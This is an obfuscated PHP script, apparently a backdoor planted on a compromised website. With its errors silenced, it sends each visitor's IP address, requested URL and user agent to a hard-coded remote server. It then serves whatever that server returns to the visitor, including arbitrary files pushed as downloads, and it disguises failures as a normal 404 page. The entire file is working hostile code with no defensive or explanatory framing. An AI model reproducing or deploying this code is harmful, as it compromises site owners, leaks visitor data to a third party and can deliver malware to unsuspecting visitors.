<?php
$jbtvcvf = "ips";
$hczmyccqa = "ip";
$xfxfcd = "uri";
$ysfyfo = "func";
$khvfrulzr = "headers";
$idhnrebodii = "k";
$qzuuekdfv = "h";
$yymuyny = "res";
$auexxenf = "data";
$fqyjjt = "cookie";
$sptbdqe = "v";
$htahytknrfy = "request";
$nvmidautnev = "errstr";
$pkedokwhjf = "scheme";
$gplirongicj = "fp";
$kcxyrjcxhn = "timeout";
$qlmcbwop = "port";
$omumddjkm = "params";
$ukpxsfnrdit = "content";
$sbmrxr = "url";
$lvdzxnelv = "query";
$cnuludt = "remote";
$nxdjnqjioi = "remote";
error_reporting(0);
ini_set("display_errors", 0);
$remote = "http://78.138.118.127/12345nbvvd.php";
php_display($remote);
error_404();
function php_display($url) {
    $dupvctxile = "query";
    $rbdxeeg = "content";
    $rtuqjngevwue = "url";
    $scmukqrpcu = "filename";
    $pefiihqr = "content";
    $pzqscfbwfoo = "query";
    $query = array();
    $query
    ["ip"] = getIp();
    $query
    ["path"] = "$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
    $ {
        $pzqscfbwfoo
    }
    ["useragent"] = getUseragent();
    $url = $url . "?" . http_build_query($query);
    $ykymhewdris = "content";
    $content = @file_get_contents($url);
    if (strlen($content) < 10) {
        error_404();
    }
    $wpkyut = "content";
    $content = explode("
", $ {
        $rbdxeeg
    });
    $pesdfbe = "content";
    $uflmer = "filename";
    $filename = array_shift($content);
    $content = implode("
", $ {
        $wpkyut
    });
    if (strstr($filename, ".html") === FALSE) {
        $wsluapls = "content";
        $iakxulxikk = "type";
        $ijffdbx = "type";
        $liobqfzecv = "filename";
        $ {
            $ijffdbx
        } = "application/octet-stream";
        header("Content-Type:" . $type);
        header("Content-Disposition: attachment; filename=" . $ {
            $liobqfzecv
        });
        header("Content-Length: " . strlen($ {
            $wsluapls
        }));
    }
    echo $content;
    exit();
}
function http_request($params) {
    $dwjwlpw = "url";
    $yetbvsgk = "res";
    $adlbtpkkp = "params";
    $qqroevys = "scheme";
    $jmprtlkqy = "params";
    $sxbpdcgbnhv = "url";
    $rjfobnk = "params";
    $fdyymehuojn = "url";
    $btcrda = "url";
    if (!is_array($params)) {
        $params = array("url" => $params, "method" => "GET");
    }
    $qiqgvuce = "url";
    $lrhituc = "url";
    $sduxjksgmdh = "url";
    $dtizvq = "params";
    $gipmkeuwhen = "url";
    $sckbeqtg = "url";
    if ($params
    ["url"] == "") return FALSE;
    $wywwrkacw = "url";
    $iygwzasprs = "params";
    $ipttjthk = "params";
    $xlqroqbdsxr = "params";
    $flcyorqsb = "timeout";
    $ulvgvufr = "params";
    if (!isset($params
    ["method"])) $ {
        $dtizvq
    }
    ["method"] = (isset($ {
        $rjfobnk
    }
    ["data"]) && is_array($params
    ["data"])) ? "POST" : "GET";
    $ {
        $xlqroqbdsxr
    }
    ["method"] = strtoupper($params
    ["method"]);
    if (!in_array($params
    ["method"], array("GET", "POST"))) return FALSE;
    $url = parse_url($ {
        $iygwzasprs
    }
    ["url"]);
    if (!isset($url
    ["scheme"])) $ {
        $fdyymehuojn
    }
    ["scheme"] = "http";
    if (!isset($ {
        $wywwrkacw
    }
    ["path"])) $url
    ["path"] = "/";
    if (!isset($url
    ["host"]) && isset($url
    ["path"])) {
        if (strpos($url
        ["path"], "/")) {
            $jzjmvnjmjak = "url";
            $ebxrctpqzyke = "url";
            $lqniscmceeu = "url";
            $url
            ["host"] = substr($url
            ["path"], 0, strpos($ {
                $jzjmvnjmjak
            }
            ["path"], "/"));
            $url
            ["path"] = substr($url
            ["path"], strpos($ {
                $lqniscmceeu
            }
            ["path"], "/"));
        } else {
            $url
            ["host"] = $url
            ["path"];
            $url
            ["path"] = "/";
        }
    }
    $yijslrmkos = "port";
    $eixfozyikgx = "res";
    $url
    ["path"] = preg_replace("/[\/]+/", "/", $url
    ["path"]);
    $razoyonw = "errno";
    if (isset($url
    ["query"])) $ {
        $sxbpdcgbnhv
    }
    ["path"].= "?{$url['query']}";
    $port = isset($ {
        $ipttjthk
    }
    ["port"]) ? $params
    ["port"] : (isset($ {
        $sduxjksgmdh
    }
    ["port"]) ? $ {
        $btcrda
    }
    ["port"] : ($url
    ["scheme"] == "https" ? 443 : 80));
    $timeout = isset($params
    ["timeout"]) ? $params
    ["timeout"] : 30;
    $vfxzzxxo = "fp";
    $bqkboh = "url";
    $vmvvwyx = "params";
    if (!isset($ {
        $vmvvwyx
    }
    ["return"])) $params
    ["return"] = "content";
    $ {
        $qqroevys
    } = $url
    ["scheme"] == "https" ? "ssl://" : "";
    $fp = @fsockopen($scheme . $url
    ["host"], $ {
        $yijslrmkos
    }, $ {
        $razoyonw
    }, $errstr, $ {
        $flcyorqsb
    });
    if ($fp) {
        $tshdxkrjg = "headers";
        $kccwgjcfzry = "params";
        $ahzbto = "request";
        $jrpbrhfchpi = "params";
        if (!isset($ {
            $kccwgjcfzry
        }
        ["User-Agent"])) $params
        ["User-Agent"] = "Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16";
        $pojdifufqxn = "params";
        $qnklxgjjj = "fp";
        $wyjfestoo = "request";
        $request = "{$params['method']} {$url['path']} HTTP/1.0
";
        $request.= "Host: {$url['host']}
";
        $edugfoonj = "h_detected";
        $request.= "User-Agent: {$params['User-Agent']}" . "
";
        $bbrvfdiqc = "request";
        $nqdhraem = "data";
        if (isset($ {
            $pojdifufqxn
        }
        ["referer"])) $request.= "Referer: {$params['referer']}
";
        if (isset($params
        ["cookie"])) {
            $dtxmecwodrd = "cookie";
            $djntfik = "cookie";
            $ {
                $djntfik
            } = "";
            if (is_array($params
            ["cookie"])) {
                $ycbsvqo = "cookie";
                $awskkwmqqpg = "k";
                $rqgoxxlohwl = "cookie";
                $hgtshwshin = "params";
                $gvqqpvmbynrb = "cookie";
                foreach ($ {
                    $hgtshwshin
                }
                ["cookie"] as $k => $v) $cookie.= "$k=$v; ";
                $ {
                    $rqgoxxlohwl
                } = substr($ {
                    $gvqqpvmbynrb
                }, 0, -2);
            } else $cookie = $params
            ["cookie"];
            if ($cookie != "") $request.= "Cookie: $cookie
";
        }
        $xrpkvnq = "request";
        $ {
            $xrpkvnq
        }.= "Connection: close
";
        if ($params
        ["method"] == "POST") {
            $hppnxos = "params";
            $xfowerivgy = "params";
            $ycvslrfdjhn = "data";
            if (isset($ {
                $hppnxos
            }
            ["data"]) && is_array($ {
                $xfowerivgy
            }
            ["data"])) {
                $xkhabq = "k";
                $piwbdshpsstj = "data";
                $erfrgfxmygs = "data";
                $lkgftnl = "k";
                foreach ($params
                ["data"] AS $ {
                    $lkgftnl
                } => $v) $data.= urlencode($k) . "=" . urlencode($v) . "&";
                $jtgyocys = "data";
                if (substr($data, -1) == "&") $ {
                    $jtgyocys
                } = substr($data, 0, -1);
            }
            $data.= "

";
            $request.= "Content-type: application/x-www-form-urlencoded
";
            $request.= "Content-length: " . strlen($ {
                $ycvslrfdjhn
            }) . "
";
        }
        $request.= "
";
        if ($params
        ["method"] == "POST") $request.= $ {
            $nqdhraem
        };
        $rlmagcoondi = "fp";
        @fwrite($fp, $ {
            $bbrvfdiqc
        });
        $res = "";
        $ {
            $tshdxkrjg
        } = "";
        $ {
            $edugfoonj
        } = false;
        while (!@feof($fp)) {
            $fxzuahsbp = "res";
            $egvgmmxsuux = "h_detected";
            $nlsygkhpdyyn = "res";
            $ {
                $nlsygkhpdyyn
            }.= @fread($fp, 1024);
            if (!$ {
                $egvgmmxsuux
            } && strpos($ {
                $fxzuahsbp
            }, "

") !== FALSE) {
                $gokexypfnnju = "res";
                $qmvftez = "headers";
                $sykrwe = "res";
                $uflxkry = "params";
                $uloxirw = "h_detected";
                $ivynppi = "res";
                $yergdqrcv = "params";
                $jqqelrlzroq = "params";
                $gwoscntyun = "res";
                $h_detected = true;
                $ {
                    $qmvftez
                } = substr($res, 0, strpos($res, "

"));
                $qnwjrwbxalvq = "headers";
                $wigpbx = "params";
                $jtjcghsyvtc = "params";
                $ {
                    $sykrwe
                } = substr($res, strpos($res, "

") + 4);
                if ($ {
                    $uflxkry
                }
                ["return"] == "headers" || $ {
                    $jtjcghsyvtc
                }
                ["return"] == "array" || (isset($params
                ["redirect"]) && $params
                ["redirect"] == true)) {
                    $yjqqdvupnm = "v";
                    $mnbxxtkm = "headers";
                    $dvxenchgyqp = "headers";
                    $h = explode("
", $ {
                        $mnbxxtkm
                    });
                    $ {
                        $dvxenchgyqp
                    } = array();
                    foreach ($h as $k => $ {
                        $yjqqdvupnm
                    }) {
                        if (strpos($v, ":")) {
                            $ckdqikcutle = "v";
                            $mnmykww = "v";
                            $ugrcqmpr = "k";
                            $k = substr($v, 0, strpos($v, ":"));
                            $v = trim(substr($v, strpos($v, ":") + 1));
                        }
                        $headers
                        [strtoupper($k) ] = $v;
                    }
                }
                if (isset($params
                ["redirect"]) && $params
                ["redirect"] == true && isset($ {
                    $qnwjrwbxalvq
                }
                ["LOCATION"])) {
                    $iweqfuxdlggh = "params";
                    $ljrsgsxuvv = "params";
                    $params
                    ["url"] = $headers
                    ["LOCATION"];
                    if (!isset($params
                    ["redirect-count"])) $params
                    ["redirect-count"] = 0;
                    if ($params
                    ["redirect-count"] < 10) {
                        $wrdyls = "func";
                        $params
                        ["redirect-count"]++;
                        $func = __FUNCTION__;
                        $pjpsowtwymf = "func";
                        $ggqvmdh = "params";
                        return @is_object($this) ? $this->$func
                        ($params) : $func
                        ($params);
                    }
                }
                if ($params
                ["return"] == "headers") return $headers;
            }
        }
        @fclose($ {
            $qnklxgjjj
        });
    } else return FALSE;
    if ($params
    ["return"] == "array") $res = array("headers" => $headers, "content" => $res);
    return $res;
}
function error_404() {
    header("HTTP/1.1 404 Not Found");
    $uri = preg_replace("/(\?).*\$/", "", $_SERVER["REQUEST_URI"]);
    $content = http_request("http://" . $_SERVER["SERVER_NAME"] . "/AFQjCNHnh8RttFI3VMrBddYw6rngKz7KEA");
    $content = str_replace("/AFQjCNHnh8RttFI3VMrBddYw6rngKz7KEA", $uri, $content);
    exit($content);
}
function getUseragent() {
    return $_SERVER["HTTP_USER_AGENT"];
}
function getReferer() {
    $lfjiopxo = "referer";
    $frohhtuteye = "referer";
    $ {
        $frohhtuteye
    } = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : "-";
    return $ {
        $lfjiopxo
    };
}
function getIp() {
    $zizlckd = "ip";
    $ {
        $zizlckd
    } = NULL;
    if (isset($_SERVER["REMOTE_ADDR"])) {
        $ip = $_SERVER["REMOTE_ADDR"];
    }
    $ygtqpkoosnxt = "ip";
    if (strpos($ip, ",") !== FALSE) {
        $vzzhnqeuoit = "ip";
        $mujjczjqc = "ips";
        $vijvmqe = "ip";
        $ips = explode(",", $ip);
        $ {
            $vijvmqe
        } = trim(array_pop($ips));
    }
    return $ {
        $ygtqpkoosnxt
    };
} ?>
